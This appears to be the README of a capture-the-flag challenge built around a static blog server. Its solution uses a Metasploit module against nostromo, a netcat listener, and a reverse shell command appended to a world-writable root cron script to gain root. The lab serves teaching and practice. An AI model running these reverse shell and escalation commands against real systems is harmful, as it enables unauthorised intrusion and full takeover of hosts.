# My first blog

```text
Here is a link to my new blog!  I read about a bunch of exploits in common server side blog tools so I just decided to make my website static.  Hopefully that should keep it secure. 
```

## Setup

1. `docker build -t my-first-blog .`
2. `docker run --rm -it  my-first-blog`

## Brief Dev Description

The challenge has two stages.  Gaining a shell by using an exploit in nostromo and then gaining root by taking advantage of the world writeable /usr/bin/healthcheck.  healthcheck is run as root by a cron job every minute so if you add code the make a reverse shell at the end then you can get a root shell and thus the flag.  

## Solution

1. metasploit has a module for this vulnerability (exploit/multi/http/nostromo_code_exec) so thats the simplest method.  Set your rhosts/lhost/payload appropriately and then exploit.  
3. setup a reverse shell listener on your computer - `nc -lvp 4445`
3. You'll need to write a reverse shell command to the end of /usr/bin/healthcheck.  It can be done with `echo "\nnc -e /bin/sh 127.0.0.1 4445" >> /usr/bin/healthcheck`
4. wait about a minute
5. cat flag.txt
